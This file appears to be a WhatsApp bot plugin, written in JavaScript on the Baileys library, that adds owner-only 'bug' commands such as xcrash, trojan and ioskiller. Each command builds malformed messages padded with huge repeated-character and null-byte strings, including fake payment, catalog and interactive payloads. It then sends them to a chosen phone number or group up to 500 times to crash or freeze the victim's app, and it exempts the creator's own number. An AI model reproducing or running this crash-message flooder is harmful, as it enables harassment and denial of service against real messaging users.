const BAILEYS_PKG = packages.baileys;
const {
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
} = require(BAILEYS_PKG);
const fs = require("fs")

module.exports = {
name: ["xcrash","trojan","sendbug","fc","bug","ioskiller"],
cmd: ["xcrash","trojan","sendbug","fc","bug","ioskiller"],
category: "virbug",
desc: "Perintah berisiko tinggi (spam/bug). Gunakan hanya untuk pengujian dan owner-only.",
owner: true,
async handler(m, { conn, q, prefix, command, args, isCreator }) {
if (setting.process.bug[m.sender]) return m.reply("Sedang ada proses bug tunggu sampai proses yang sebelumnya selesai")

async function sendMultipleTypesOfMessages(recipientJid) {

var location = generateWAMessageFromContent(recipientJid, proto.Message.fromObject({
      'viewOnceMessage': {
        'message': {
          'liveLocationMessage': {
            'degreesLatitude': 'p',
            'degreesLongitude': 'p',
            'caption': textBug + 'ꦾ'.repeat(0xc350),
            'sequenceNumber': '0',
            'jpegThumbnail': ''
          }
        }
      }
    }), { 'userJid': recipientJid });

    await conn.relayMessage(recipientJid, location.message, { 'participant': { 'jid': recipientJid }, 'messageId': location.key.id });
    
    /*
    const pesvbug = generateWAMessageFromContent(recipientJid, {
  viewOnceMessage: {
  message: {
  "messageContextInfo": {
  "deviceListMetadata": {},
  "deviceListMetadataVersion": 2
  },
  interactiveMessage: proto.Message.InteractiveMessage.create({
  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
      {
		"name": "review_and_pay",
		"buttonParamsJson": `{"currency":"IDR","payment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":5000,"offset":1},"reference_id":"DARI ${author.toUpperCase()}","type":"physical-goods","payment_method":"","order":{"status":"payment_requested","description":${"M4MP0S".repeat(100000)},"subtotal":{"value":0,"offset":1},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":"custom-item-119a8e27-a410-4457-bf52-f3618ebd45ab","name":"Yakin Kebal Virus Bug De??","amount":{"value":5000,"offset":1},"quantity":1}]},"additional_note":"Yakin Kebal Virus Bug De??","native_payment_methods":[]}`
	  }
	]
  })
  })
  }
  }
  }, { userJid: recipientJid, quoted: { key: { participant: "0@s.whatsapp.net", fromMe: false }, message: { conversation: "BL4CK - H0L6 " + 'ꦾ'.repeat(149000) }}})
  await conn.relayMessage(pesvbug.key.remoteJid, pesvbug.message, {
  messageId: pesvbug.key.id
  })
*/
    var catalog = generateWAMessageFromContent(recipientJid, proto.Message.fromObject({
      'listMessage': {
        'title': textBug + "\0".repeat(0xe09c0),
        'footerText': textBug,
        'description': textBug,
        'buttonText': null,
        'listType': 0x2,
        'productListInfo': {
          'productSections': [{
            'title': "anjay",
            'products': [{
              'productId': "4392524570816732"
            }]
          }],
          'productListHeaderImage': {
            'productId': "4392524570816732",
            'jpegThumbnail': null
          },
          'businessOwnerJid': "0@s.whatsapp.net"
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 0x93a80,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': 'whatsapp',
        'entryPointConversionDelaySeconds': 0x9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 0x2,
      'product_header_info': {
        'product_header_info_id': 0x4433e2e130,
        'product_header_is_rejected': false
      }
    }), { 'userJid': recipientJid });
    
    await tool.sleep(1000)
    await conn.relayMessage(recipientJid, catalog.message, { 'participant': { 'jid': recipientJid }, 'messageId': catalog.key.id });

    var button = generateWAMessageFromContent(recipientJid, proto.Message.fromObject({
      'viewOnceMessage': {
        'message': {
          'interactiveMessage': {
            'header': {
              'title': '',
              'subtitle': " "
            },
            'body': {
              'text': "Z4CK - H0L6꙰"
            },
            'footer': {
              'text': author.toLowerCase()
            },
            'nativeFlowMessage': {
              'buttons': [{
                'name': 'cta_url',
                'buttonParamsJson': "{ display_text : 'Z4CK - H0L6꙰', url : , merchant_url :  }"
              }],
              'messageParamsJson': "\0".repeat(0xf4240)
            }
          }
        }
      }
    }), { 'userJid': recipientJid });

    await tool.sleep(1000)
    await conn.relayMessage(recipientJid, button.message, { 'participant': { 'jid': recipientJid }, 'messageId': button.key.id });

    await tool.sleep(1000)
    conn.relayMessage(recipientJid, {
      'extendedTextMessage': {
        'text': '.',
        'contextInfo': {
          'stanzaId': recipientJid,
          'participant': recipientJid,
          'quotedMessage': {
            'conversation': textBug + 'ꦾ'.repeat(0xc350)
          },
          'disappearingMode': {
            'initiator': "CHANGED_IN_CHAT",
            'trigger': 'CHAT_SETTING'
          }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
      }
    }, {
      'participant': { 'jid': recipientJid }
    }, { 'messageId': null });
    
}

async function sendKillApple(recipientJid) {
    var message = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            extendedTextMessage: {
                text: '𝟾𝟙𝟗𝟞𝟨𝟚-𝟭𝟨𝟜𝟜',
                contextInfo: {
                    stanzaId: recipientJid,
                    participant: recipientJid,
                    quotedMessage: {
                        conversation: '؂Ù†؃؄Ù½؂Ù†؃؄Ù½'.repeat(40000),
                    },
                    disappearingMode: {
                        initiator: 'CHANGED_IN_CHAT',
                        trigger: 'CHAT_SETTING',
                    },
                },
                inviteLinkGroupTypeV2: 'DEFAULT',
            },
        }),
        { userJid: recipientJid }
    );
    await conn.relayMessage(recipientJid, message.message, {
        participant: { jid: recipientJid },
        messageId: message.key.id,
    });

    await conn.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'onlymans',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    )
}

let [target, spamAmont] = q.split(',');
let spamAmount = isRank ? 200 : spamAmont

if (!setting.process.bug[m.sender]) {
setting.process.bug[m.sender] = false
}

let phoneNumber = target.endsWith("@g.us") ? target : target.replace(/[^0-9]/g, '');
if (!phoneNumber) return m.reply(`*Format :*\n${prefix}${command} 628xxxx`)

// Avoid certain phone numbers
if (owner.includes(phoneNumber)) return m.reply("*Tidak dapat mengirim bug ke pembuatnya*")

if (!target.endsWith("@g.us")) {
let isOnWhatsApp = await conn.onWhatsApp(phoneNumber + '@s.whatsapp.net');
if (isOnWhatsApp.length === 0) return m.reply('*Nomor tersebut tidak terdaftar di aplikasi WhatsApp.*')
}

let userJid = target.endsWith("@g.us") ? phoneNumber : (phoneNumber + '@s.whatsapp.net');
m.reply('*Bug Sedang Diproses...*');
setting.process.bug[m.sender] = true

let repeatCount = spamAmount ? parseInt(spamAmount) : 500
if (command === "ioskiller") {
for (let i = 0; i < repeatCount; i++) {
await tool.sleep(7000);
sendKillApple(userJid);
}
} else {
for (let i = 0; i < repeatCount; i++) {
await tool.sleep(7000);
sendMultipleTypesOfMessages(userJid);
}
}


m.reply(`*Berhasil mengirim ${command} kepada @${userJid.split('@')[0]}, dengan jumlah spam ${repeatCount} bug*`, { withTag: true })
setting.process.bug[m.sender] = false
}}
